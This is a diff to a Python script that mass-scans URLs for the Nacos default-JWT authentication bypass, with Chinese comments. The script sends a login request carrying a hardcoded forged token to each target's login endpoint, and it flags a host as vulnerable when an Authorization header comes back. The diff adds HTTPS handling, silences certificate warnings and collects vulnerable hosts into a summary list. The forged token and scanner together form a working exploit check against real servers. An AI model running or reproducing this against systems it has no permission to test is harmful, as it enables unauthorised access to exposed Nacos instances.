@@ -4,9 +4,9 @@ import argparse
 import requests
 import sys
 import re
-import signal
 import threading
 from requests.exceptions import RequestException
+from urllib3.exceptions import InsecureRequestWarning
 
 jwt_token_str="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDY3ODk3MDQyM30.lnslDXAElX0J_STPpWmBOmiQaVcU3eK3F7McFehD_6I"
 
@@ -23,9 +23,14 @@ data = {
     "password":"testtest"
     }
 
+vulurl=[]
+
 #url合规检测执行
 def urltest(url):
     parsed_url = urlsplit(url)
+    if parsed_url.port == "443" and parsed_url.netloc:
+        url="https://"+parsed_url.netloc+"/nacos/v1/auth/users/login"
+        vultest(url) 
     if parsed_url.netloc and parsed_url.path:
         url=parsed_url.scheme+"://"+parsed_url.netloc+"/nacos/v1/auth/users/login"
         vultest(url)
@@ -50,7 +55,9 @@ def vultest(url):
         response = requests.post(url, data=data, headers=headers, verify=False , timeout=3)
         # 检查响应头的状态码是否为200
         if response.status_code == 200 and ("Authorization" in response.headers):
+            vulurl.append(url)
             print(url+"  [+]漏洞存在！！！")
+            
         else:
             print(url+"  [-]漏洞不存在。")
     except RequestException:
@@ -59,6 +66,8 @@ def vultest(url):
 
 #读取url或file
 def main():
+    # 禁用警告
+    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
     parser = argparse.ArgumentParser(description="读取命令行参数")
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument('-u', '--url', help='URL 参数')
@@ -76,6 +85,10 @@ def main():
                 read_thread.start()
             for thread in threads_queue:
                 thread.join()
+
+    print("存在漏洞列表：")
+    for url in vulurl:
+        print(url+"  [+]漏洞存在！！！")
 
 if __name__ == "__main__":
     main()
